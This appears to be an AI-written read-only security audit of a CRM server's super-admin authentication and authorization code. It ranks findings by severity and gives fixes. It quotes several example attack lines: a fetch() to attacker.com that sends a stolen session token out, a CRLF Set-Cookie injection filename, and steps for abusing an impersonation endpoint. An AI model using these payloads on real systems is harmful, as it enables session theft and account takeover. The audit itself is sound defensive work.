# S05 — Master / Super-Admin Authentication & Authorization

**Auditor:** Claude (Sonnet 4.6) — read-only, 2026-05-05  
**Scope:** masterAuth.ts · localhostOnly.ts · super-admin.routes.ts · super-admin-management.routes.ts · admin/super-admin.html · admin/js/* · masterAudit.ts · db/master-connection.ts

---

## FINDING S05-01 — MEDIUM

**Title:** Impersonation endpoint missing step-up TOTP requirement

**Location:** `packages/server/src/routes/super-admin.routes.ts` line 2582

**Description:**  
`POST /tenants/:slug/impersonate` issues a valid 15-minute tenant-scoped JWT signed with `config.accessJwtSecret` (the same key used for ordinary tenant logins) carrying `impersonated: true`. This token grants full CRM access as the tenant's admin user. Unlike every other destructive super-admin action (suspend, delete, plan-change, backup-restore, config-write, force-disable-2fa, session-kick), this route does **not** include `requireStepUpTotpSuperAdmin(...)`. An attacker who hijacks a super-admin session within the 30-minute JWT window can silently impersonate any tenant's admin without a second TOTP challenge.

**Impact:**  
Session theft → full tenant access without additional friction. The `impersonated: true` flag is carried in the JWT payload but the tenant-side `authMiddleware` does not enforce any additional check based on that flag (confirmed: no references to `impersonated` in `middleware/auth.ts`). The only existing guard is the 15-minute TTL and the session row in the tenant DB.

**Reproduction:**
1. Steal a valid super-admin JWT (XSS, shoulder-surf, shared terminal).
2. `POST /super-admin/api/tenants/<slug>/impersonate` — no TOTP code required.
3. Receive a `bizarre-crm-api` audience token valid for 15 min.

**Recommendation:**  
Add `requireStepUpTotpSuperAdmin('super_admin_impersonate')` to the `/tenants/:slug/impersonate` route, immediately before the async handler, consistent with all other privilege-escalation paths. Also add awareness in `authMiddleware` to optionally flag or restrict `impersonated: true` tokens (e.g., block password-change and 2FA-setup inside an impersonation session).

---

## FINDING S05-02 — LOW

**Title:** `superAdminSecret` has a predictable dev fallback derivable from `JWT_SECRET`

**Location:** `packages/server/src/config.ts` lines ~413-416

**Description:**  
In single-tenant development mode (not production, not `MULTI_TENANT=true`), if `SUPER_ADMIN_SECRET` is unset, the config falls back to:
```ts
crypto.createHash('sha256').update((process.env.JWT_SECRET || 'dev') + ':super-admin-dev-v1').digest('hex')
```
If `JWT_SECRET` is also unset (common in fresh checkouts), the fallback is fully deterministic: `sha256('dev:super-admin-dev-v1')`. An attacker who has read access to the source code and knows this fallback (it is in-repo) can forge valid super-admin JWTs in any dev/single-tenant deployment where neither secret was explicitly set.

**Impact:**  
Low in isolation — production exits fatally if the secret is missing, and multi-tenant also exits. The blast radius is limited to unlocked dev/single-tenant boxes. However, a single-tenant operator who never sets the env var and exposes port 443 is silently vulnerable.

**Recommendation:**  
Generate and log a random ephemeral secret on startup when neither env var is set, rather than using a deterministic derivation. E.g.:
```ts
const ephemeral = crypto.randomBytes(32).toString('hex');
console.warn('[WARN] No SUPER_ADMIN_SECRET set; using ephemeral secret for this process only.');
return ephemeral;
```
This ensures the fallback cannot be pre-computed from public source code.

---

## FINDING S05-03 — LOW

**Title:** Origin-header CSRF guard does not cover `/super-admin/api/*` paths in production

**Location:** `packages/server/src/index.ts` lines 1144–1168 (origin guard), 1468 (route mount)

**Description:**  
The production-only Origin-header guard that rejects state-changing requests without an `Origin` header only applies when `req.path.startsWith('/api/')`. Super-admin routes are mounted at `/super-admin/api/…`, so the guard's early-return (`if (!req.path.startsWith('/api/')) return next()`) silently bypasses it. The CSRF defense for these routes therefore relies entirely on:
1. `localhostOnly` — preventing any request originating outside 127.0.0.1/::1 at the TCP layer.
2. The Content-Type check (JSON required) — which blocks HTML form submissions.
3. Bearer-token authentication (no cookie).

Because the routes use Bearer tokens (not cookies), classical CSRF is not directly exploitable. However, a CSRF via `fetch()` from an arbitrary local page or from a compromised browser extension running on the same host could still reach these endpoints if the browser sends a valid Authorization header. The defense-in-depth coverage gap is noteworthy.

**Impact:**  
Low. Practical exploitation requires co-residency on the same host (same as reaching the loopback interface), and Bearer auth prevents cookie-based CSRF. No direct exploitable path.

**Recommendation:**  
Extend `isPathNoOriginExempt` or the guard's `startsWith` check to also cover `/super-admin/api/` paths, or add an explicit Origin check inside `superAdminAuth` middleware for non-GET methods.

---

## FINDING S05-04 — INFO

**Title:** Audit log IP recorded via `req.ip` (trust-proxy-aware) rather than raw socket

**Location:** `packages/server/src/routes/super-admin.routes.ts` (throughout `auditLog` calls), `packages/server/src/routes/super-admin-management.routes.ts` line 245 (`auditOp`)

**Description:**  
All audit log writes use `req.ip` for the IP address field. Express's `req.ip` honours `X-Forwarded-For` when `trust proxy` is configured. The production config restricts trusted proxies to an explicit allowlist (`TRUSTED_PROXY_IPS` + loopback), which is correctly hardened. However, `localhostOnly` correctly uses `req.socket.remoteAddress` (the actual TCP address), while the audit log uses `req.ip`. If a misconfigured or legitimately-trusted reverse proxy is chained in front and forwards a spoofed `X-Forwarded-For`, the audit trail shows the attacker-controlled IP rather than the real source.

This is distinct from the `localhostOnly` check, which is not bypassable. The audit-log IP is a forensic concern only.

**Impact:**  
INFO. The `localhostOnly` guard prevents any non-local access. Only relevant if the proxy allowlist is misconfigured.

**Recommendation:**  
For maximum audit fidelity, record both `req.ip` and `req.socket.remoteAddress` in the `details` column for sensitive audit actions (tenant create/delete, impersonation, JWT rotation).

---

## FINDINGS SUMMARY

| ID | SEV | Title |
|----|-----|-------|
| S05-01 | MEDIUM | Impersonation endpoint missing step-up TOTP |
| S05-02 | LOW | Predictable dev fallback for `superAdminSecret` |
| S05-03 | LOW | Origin CSRF guard bypassed for `/super-admin/api/*` |
| S05-04 | INFO | Audit IP uses `req.ip` instead of raw socket |

---

---

## PASS 2 — DEEP DIVE

### CRITICAL — `requireStepUpTotpSuperAdmin` queries wrong column names: all step-up-gated endpoints throw 500

**Where:** `packages/server/src/middleware/stepUpTotp.ts:362` vs `packages/server/src/db/master-connection.ts:70–72`

**What:**
`requireStepUpTotpSuperAdmin` (used to gate tenant-delete, plan-update, suspend/activate, backup-restore, JWT rotation, session-kick, config-write, force-disable-2FA, webhook-retry, rate-limit reset, DNS backfill — 17 routes total) queries the `super_admins` table for columns `totp_secret`, `totp_iv`, `totp_tag`. The actual column names in the schema are `totp_secret_enc`, `totp_secret_iv`, `totp_secret_tag`. SQLite/better-sqlite3 throws `SqliteError: no such column: totp_secret` at runtime when the prepared statement executes. Because the async middleware has no try/catch around this query, the error propagates to Express's global error handler, which returns HTTP 500. Every single step-up-gated super-admin endpoint is therefore permanently broken at the runtime level.

**Code:**
```typescript
// stepUpTotp.ts:362 — wrong column names
const dbAdmin = masterDb
  .prepare('SELECT id, email, totp_secret, totp_iv, totp_tag FROM super_admins WHERE id = ? AND is_active = 1')
  .get(superAdmin.superAdminId)

// master-connection.ts:70–72 — actual schema columns
totp_secret_enc TEXT,
totp_secret_iv TEXT,
totp_secret_tag TEXT,
```

**Exploit:**
Any authenticated super-admin calling `DELETE /super-admin/api/tenants/:slug`, `PUT /tenants/:slug`, `POST /tenants/:slug/suspend`, or any other step-up-gated operation receives 500 and cannot complete the action. This is a complete operational DoS on all destructive fleet-management actions. Conversely, if the error were silently swallowed (e.g., by a future try/catch patch that returns next()), every step-up gate would fail open, bypassing TOTP for all destructive operations.

**Fix:**
Change line 362 of `stepUpTotp.ts` to `SELECT id, email, totp_secret_enc, totp_secret_iv, totp_secret_tag FROM super_admins` and update the TypeScript type and all references on lines 363–409 accordingly. Add an integration test that calls a step-up-gated route and verifies it demands TOTP, not 500.

---

### HIGH — `spaCsp` allows `'unsafe-inline'` script-src on the super-admin SPA served to localhost

**Where:** `packages/server/src/index.ts:1495`

**What:**
The Content-Security-Policy applied to the super-admin SPA (`/super-admin/*`) is `script-src 'self' 'unsafe-inline'`. The comment at line 1492 acknowledges this is required by "Vite's bundle" using "small inline scripts to bootstrap modules." However, `'unsafe-inline'` allows any injected script tag (e.g., via stored XSS in an API response value that gets `innerHTML`-rendered) to execute. Given that the SPA renders tenant data (tenant names, slugs, usernames, announcement text, audit log details, user-agents, IP addresses, notification recipients) from untrusted sources, a stored XSS in any of those fields could leverage `'unsafe-inline'` to exfiltrate the super-admin session token stored in `sessionStorage` or perform any action as the super-admin.

**Code:**
```typescript
// index.ts:1495
const spaCsp = "default-src 'self'; script-src 'self' 'unsafe-inline'; script-src-attr 'none'; " +
  "style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' ws: wss:; " +
  "font-src 'self' data:; frame-ancestors 'none'";
```

**Exploit:**
If a tenant slug, shop name, or announcement body contains a stored XSS payload that reaches an `innerHTML` sink in the React SPA (whose own sanitization may have gaps), the `'unsafe-inline'` CSP permits script execution. The attacker could steal `sessionStorage.getItem('sa_token')` and call any super-admin API endpoint, including impersonation of any tenant.

**Fix:**
Use a nonce-based or hash-based `script-src` for the Vite bundle rather than `'unsafe-inline'`. Vite supports injecting a per-request nonce via the `vite-plugin-csp` or by configuring `build.modulePreload.polyfill: false` and using `<script type="module">` with a nonce. This is the standard solution for Vite + CSP. Alternatively, use `'strict-dynamic'` with a nonce.

---

### HIGH — `/admin` HTML page and `/admin/js/*` static files served without `localhostOnly`

**Where:** `packages/server/src/index.ts:1473, 1782`

**What:**
`/super-admin/*` is gated by `localhostOnly` middleware. However, `/admin` (the legacy single-tenant admin panel HTML) and `/admin/js/*` (the JavaScript files for BOTH admin panels — `admin.js` and `super-admin.js`) are served WITHOUT `localhostOnly`. Any remote attacker who can reach the server's TCP port can download `super-admin.js`, read the full super-admin API surface, endpoint paths, login flow, TOTP flow, session storage key name (`sa_token`), and authentication header format (`Authorization: Bearer`). This is an information disclosure that significantly aids reconnaissance.

**Code:**
```typescript
// index.ts:1473 — no localhostOnly
app.use('/admin/js', express.static(path.resolve(__dirname, 'admin/js'), { index: false }));

// index.ts:1782 — no localhostOnly
app.get('/admin', (req, res) => {
  res.setHeader('Content-Security-Policy', adminCsp);
  res.sendFile(path.resolve(__dirname, 'admin/index.html'));
});
```

**Exploit:**
An external attacker GETs `https://crm.example.com/admin/js/super-admin.js` and receives the full JavaScript source. They learn the exact API paths, authentication mechanism, token storage key, and step-up TOTP header name — reducing the time-to-exploit for any further vulnerability they discover.

**Fix:**
Add `localhostOnly` middleware to both the `/admin/js` static mount and the `/admin` GET route:
```typescript
app.use('/admin/js', localhostOnly, express.static(...));
app.get('/admin', localhostOnly, (req, res) => { ... });
```

---

### MEDIUM — Backup download `Content-Disposition` header injection via unquoted double-quote in filename

**Where:** `packages/server/src/routes/super-admin.routes.ts:1480`

**What:**
The `rejectUnsafeFilename` guard (line 1360–1368) blocks `..`, `/`, `\`, null bytes, and Windows device names, but does NOT strip or reject the `"` (double-quote) character or `\r\n`. The filename is then embedded verbatim in the `Content-Disposition` response header inside double quotes: `attachment; filename="${filename}"`. A backup file whose name contains a double quote (possible if the backup service generates filenames from tenant slugs containing special chars, or if an operator manually names a file) would break the RFC 6266 header structure and could allow response header injection if CRLF bytes appear.

**Code:**
```typescript
// super-admin.routes.ts:1480
res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
```

**Exploit:**
An attacker with super-admin access and the ability to name a backup file (via the backup-settings path parameter) to contain `";\r\nSet-Cookie: admin=pwned` could inject a `Set-Cookie` header into the download response. Blast radius is limited: requires existing super-admin access, and modern browsers reject CRLF in header values (Node/Express also sanitizes these). Realistic impact is header structure breakage.

**Fix:**
Sanitize the filename for `Content-Disposition` use: either percent-encode it (`encodeURIComponent(filename)` and use `filename*=UTF-8''...` per RFC 5987), or add `"` and `\r\n` to the `rejectUnsafeFilename` guard.

---

### LOW — `super-admin.js` stores session token in `sessionStorage` (XSS-accessible)

**Where:** `packages/server/src/admin/js/super-admin.js:2, 148`

**What:**
The super-admin SPA stores the bearer token in `sessionStorage` (`sessionStorage.setItem('sa_token', token)`). While `sessionStorage` does not persist across browser sessions like `localStorage`, it is equally accessible to JavaScript running on the same page origin, including via XSS. Since the SPA uses `'unsafe-inline'` CSP (see S05-P2-02 above), any XSS payload can read `sessionStorage.getItem('sa_token')` and exfiltrate the 30-minute super-admin JWT.

**Code:**
```javascript
// super-admin.js:2
let token = sessionStorage.getItem('sa_token');
// super-admin.js:148
sessionStorage.setItem('sa_token', token);
```

**Exploit:**
XSS in the SPA (enabled by `'unsafe-inline'` CSP) runs `fetch('https://attacker.com/?t=' + sessionStorage.getItem('sa_token'))` and exfiltrates the super-admin JWT. With that token the attacker can call read-only super-admin endpoints immediately, or wait for the step-up TOTP column-name bug to be fixed and then escalate.

**Fix:**
Store the token only in a `httpOnly` cookie (requires a login-endpoint cookie response and `credentials: 'include'` in fetch calls) so JavaScript cannot access it at all. If sessionStorage is retained, fix the CSP `'unsafe-inline'` gap first.

---

### LOW — `requireStepUpTotpSuperAdmin` TOTP replay window covers adjacent-but-distinct super-admins

**Where:** `packages/server/src/middleware/stepUpTotp.ts:87–103`

**What:**
The TOTP replay-prevention `claimCode(userId, code)` keys consumed codes on `userId:code:windowBucket`. For `requireStepUpTotpSuperAdmin`, `userId` is `superAdminId`. In a system with two super-admins (A and B), super-admin A consuming code `123456` only blocks A from replaying it. Super-admin B could simultaneously use the same code `123456` (valid because they share the same TOTP secret management pattern — but in practice each has a unique secret). This is correct behavior because B's TOTP secret is different. However, the key design note is worth verifying: if a future multi-super-admin scenario ever reuses a TOTP secret across super-admins (e.g., a shared TOTP during onboarding), the replay guard is keyed on super-admin ID, not on the actual TOTP secret, so the cross-admin isolation holds only when secrets are unique.

**Code:**
```typescript
// stepUpTotp.ts:87–103
function claimCode(userId: number, code: string): boolean {
  const bucket = Math.floor(Date.now() / 30_000);
  const keys = [`${userId}:${code}:${bucket-1}`, `${userId}:${code}:${bucket}`, `${userId}:${code}:${bucket+1}`];
  for (const k of keys) { if (consumedCodes.has(k)) return false; }
  for (const k of keys) { consumedCodes.set(k, Date.now()); }
  return true;
}
```

**Exploit:**
No direct exploit as long as each super-admin has a unique TOTP secret. If shared secrets are ever introduced (e.g., a backup TOTP device for a team), replay prevention becomes per-person rather than per-secret, which could allow one actor to replay another's consumed code.

**Fix:**
Key consumed codes on `secret_fingerprint:code:bucket` (first 8 chars of the decrypted secret's SHA-256) rather than `userId:code:bucket`. This ensures uniqueness per TOTP secret regardless of how many super-admins share an account setup.

---

### INFO — `POST /announcements` not gated by step-up TOTP despite writing platform-wide content

**Where:** `packages/server/src/routes/super-admin.routes.ts:1792`

**What:**
`POST /announcements` (creates a platform-wide announcement visible to all tenants) requires only super-admin session auth, not step-up TOTP. In contrast, less consequential operations like resetting rate limits or updating backup settings require step-up. A hijacked 30-minute super-admin token can create arbitrary announcements (up to 10,000 chars) without an additional TOTP challenge. Announcement body is stored as plaintext and rendered by the tenant dashboard; if the tenant dashboard renders announcement body as HTML without escaping, this becomes a stored XSS vector.

**Fix:**
Add `requireStepUpTotpSuperAdmin('super_admin_announcement_create')` to `router.post('/announcements', ...)` for defense-in-depth. Also verify the tenant dashboard escapes announcement body before rendering.

---

### INFO — Audit log `GET /audit-log` has no date-range filter or offset pagination

**Where:** `packages/server/src/routes/super-admin.routes.ts:1721–1731`

**What:**
The audit log endpoint accepts `?limit` (capped to 100 by `parsePageSize`) and always orders by `created_at DESC`. There is no `offset` parameter, no cursor, and no date filter. On a long-running fleet with thousands of audit entries, the endpoint can only ever return the 100 most recent entries. Forensic review of historical actions (e.g., verifying who deleted a tenant 3 months ago) is impossible without direct DB access.

**Fix:**
Add `?before=<ISO-timestamp>` cursor pagination or `?offset=` support so auditors can page through the full log programmatically.

---

## PASS 2 ADDITIONAL VERIFIED CLEAN

- **Column-name mismatch functional impact:** The `totp_secret_enc`/`totp_secret_iv`/`totp_secret_tag` naming is correct in `super-admin.routes.ts` login (lines 475–508) and in `stepUpTotp.ts` `decryptSuperAdminTotpSecret` (line 321). Only the SELECT query at stepUpTotp.ts:362 uses wrong short names.
- **localhostOnly on super-admin API routes:** `app.use('/super-admin/api', localhostOnly, superAdminRoutes)` at index.ts:1465 is correct. The gap is only the legacy `/admin` HTML and `/admin/js` static files.
- **`df` shell injection:** `t.mount` values in `/system/disk-space` are hardcoded server-side constants (REPO_ROOT + fixed subdirs), not user-controlled.
- **`execSync` command construction:** In `management.routes.ts` the PM2 args are passed as array to `spawnSync` (never shell-interpolated). The `df -k "${t.mount}"` in `management.routes.ts:480` uses a hardcoded path — acceptable.
- **Announcement XSS:** The super-admin SPA renders announcement body via `esc()` (verified in super-admin.js renderAuditTab / renderDashboard). The tenant-side rendering is out of scope for this slot.
- **`/admin-uploads` path traversal:** Double-guard (URL decode + `path.resolve` containment check) at index.ts:1421–1430 is solid.
- **Super-admin TOTP replay in `claimCode`:** Shared `consumedCodes` Map is process-local; in a clustered/PM2 multi-process deploy, replay prevention does not work across worker processes. This is an existing architectural limitation noted for completeness.

## PASS 2 FINDINGS SUMMARY

| ID | SEV | Title |
|----|-----|-------|
| S05-P2-01 | CRITICAL | `requireStepUpTotpSuperAdmin` wrong column names → 500 on all step-up endpoints |
| S05-P2-02 | HIGH | Super-admin SPA CSP allows `'unsafe-inline'` script-src |
| S05-P2-03 | HIGH | `/admin` HTML and `/admin/js/*` served without `localhostOnly` |
| S05-P2-04 | MEDIUM | Backup download `Content-Disposition` header injection via `"` in filename |
| S05-P2-05 | LOW | Super-admin JWT stored in `sessionStorage` (XSS-accessible) |
| S05-P2-06 | LOW | TOTP replay key is per-userId not per-secret (multi-process gap) |
| S05-P2-07 | INFO | `POST /announcements` missing step-up TOTP gate |
| S05-P2-08 | INFO | Audit log endpoint lacks offset pagination for forensic review |

---

## VERIFIED CLEAN (no findings)

- **Hardcoded credentials / default passwords:** No hardcoded passwords in super-admin creation path. `master-connection.ts` explicitly seeds NO default super admin — setup is deferred to first-run wizard. DUMMY_HASH in login is a bcrypt hash of a random string, not a usable credential.
- **localhost-only enforcement / X-Forwarded-For bypass:** `localhostOnly` correctly uses `req.socket?.remoteAddress`, not `req.ip`. Not bypassable via header spoofing.
- **Master JWT / tenant JWT key confusion:** Separate secrets (`config.superAdminSecret` vs `config.accessJwtSecret`). Separate audiences (`bizarre-crm-super-admin` vs `bizarre-crm-api`). Separate algorithm pinning with explicit `VerifyOptions` in both middlewares.
- **Cross-tenant data exposure:** All tenant-data reads inside super-admin routes use `getTenantDb(slug)` with pool-managed handles and path-containment guards. No wildcard tenant access.
- **Audit log tampering:** No API endpoint exposes DELETE or TRUNCATE on `master_audit_log`. The only deletion is a server-internal 730-day retention cron, not operator-accessible. No super-admin UI route touches audit rows.
- **XSS via unescaped tenant data in admin HTML:** Both `admin.js` and `super-admin.js` define and consistently call `esc()` (HTML entity escape) for all dynamic values inserted into innerHTML. DOM methods (`createElement`, `textContent`, `addEventListener`) are used for complex list rendering.
- **CSRF on super-admin endpoints:** Bearer token auth (no cookies) makes classical CSRF non-exploitable. The content-type guard (JSON required) blocks HTML form submissions. `localhostOnly` blocks all remote access at the TCP layer. See S05-03 for a defense-in-depth gap.
- **Reset/drop-tenant with insufficient confirmation:** `DELETE /tenants/:slug` requires `requireStepUpTotpSuperAdmin` step-up. All lifecycle operations (suspend, activate, delete, repair) audit both before and after state.
- **Hardcoded Host check bypass:** No Host-header-based access control; access control is via raw socket IP (`localhostOnly`).
